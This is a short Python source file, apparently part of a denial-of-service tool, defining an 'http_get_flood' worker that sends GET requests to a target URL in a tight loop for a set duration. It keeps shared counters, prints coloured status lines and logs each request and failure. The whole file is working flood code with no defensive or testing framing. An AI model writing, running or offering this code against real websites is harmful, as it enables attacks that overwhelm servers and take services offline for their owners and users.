import time
import requests
from colorama import Fore

def http_get_flood(target_url, duration, stop_event, lock, request_stats, thread_stats, logger=None):
    end_time = time.time() + duration
    while time.time() < end_time and not stop_event.is_set():
        try:
            res = requests.get(target_url, timeout=2)
            with lock:
                request_stats['count'] += 1
                print(Fore.BLUE + f"[✓] {res.status_code} | Total Sent: {request_stats['count']}", end="\r")
                if logger:
                    logger.info(f"[HTTP] Status: {res.status_code} | Total Sent: {request_stats['count']}")
        except Exception as e:
            print(Fore.RED + "[x] Request failed", end="\r")
            if logger:
                logger.error(f"[HTTP] Request failed: {e}")

    with lock:
        thread_stats['ended'] += 1
